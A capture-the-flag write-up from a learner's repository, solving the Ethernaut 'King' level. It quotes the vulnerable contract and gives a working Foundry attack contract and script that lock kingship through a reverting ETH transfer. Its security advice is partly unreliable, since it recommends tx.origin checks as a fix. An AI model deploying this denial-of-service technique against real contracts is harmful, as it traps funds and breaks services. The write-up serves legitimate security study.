# Ethernaut Level: King - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **King** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/king/`) contains everything related to it.

**Goal:** Become the king and prevent the level from reclaiming kingship upon submission.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 23, 2025 (Day 10).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract implements a "King of the Ether" Ponzi game: Sending more ETH than the current prize makes you king, paying the old king the new prize. The owner (level) can always reclaim with any amount.

**Key Code Snippet (from src/King/King.sol):**
```solidity
contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);  // Vulnerable: Owner bypass
        payable(king).transfer(msg.value);  // Pay old king
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## Vulnerability Analysis
**Main Issue: Reliance on Payable Receive() for Reclaim (Non-Payable King Bypass)**  
- The `receive()` triggers on plain ETH sends, but if the king is a non-payable contract (no receive/fallback), incoming ETH reverts. The owner bypass allows reclaim with small value, but if the king contract reverts on receipt, reclaim fails.  
- **Security Impact:** Ponzi mechanics are fragile; non-standard kings (contracts) DoS the game. In audits, test edge cases like contract kings.  
- **Audit Tip:** Use explicit functions for state changes; validate senders beyond value. Tools like Foundry simulate reverts on receipt.

**Example:** Become king with a non-receiving contract; level's small send reverts, failing reclaim.

## Solution Steps
The attack: Deploy a non-payable "Attack" contract, send exactly the prize ETH to trigger `receive()` and become king. Level's reclaim send to Attack reverts (no receive), preventing proclamation.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/KingSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** `_king()` returns Attack address; submit—reclaim fails, level beaten.

**Key Attack Code Snippet (from src/King/Attack.sol and script/KingSolution.s.sol):**
```solidity
// Attack Contract (src/King/Attack.sol)
contract Attack {
    address public target;

    constructor(King _target) payable {
        address(_target).call{value: _target.prize()}("");  // Trigger receive(), become king
    }
}

// Script (script/KingSolution.s.sol)
contract KingSolution is Script {
    King public kingInstance = King(payable(<your_contract_address_here>));  // REPLACE!

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Initial Prize:", kingInstance.prize());

        // Prize with Attack deploy
        uint256 attackValue = kingInstance.prize();  // Ensure > prize
        Attack attacker = new Attack{value: attackValue}(kingInstance);

        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates become king; test reclaim revert.
- **Testnet Output Example:** Console log: "Initial Prize: X wei", king changes to Attack address.

## Key Learnings
- **Auditing Skill:** Test king changes with contract senders—simulate reverts on non-payable receipts.
- **EVM Concept:** Receive() only for plain sends; missing it reverts ETH transfers.
- **Prevention:** Require EOA senders (`tx.origin` or signatures); cap prizes or use pull payments.
- **Next Step:** Add reclaim simulation in test to verify failure.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/king`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/KingSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Re-entrancy. 🚀

---

**License:** MIT  
**Author:** [0xZHD] - Smart Contract Auditor Learner  
**X:** [Zahedul I Sadik](@0xZHD_X)  
**References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)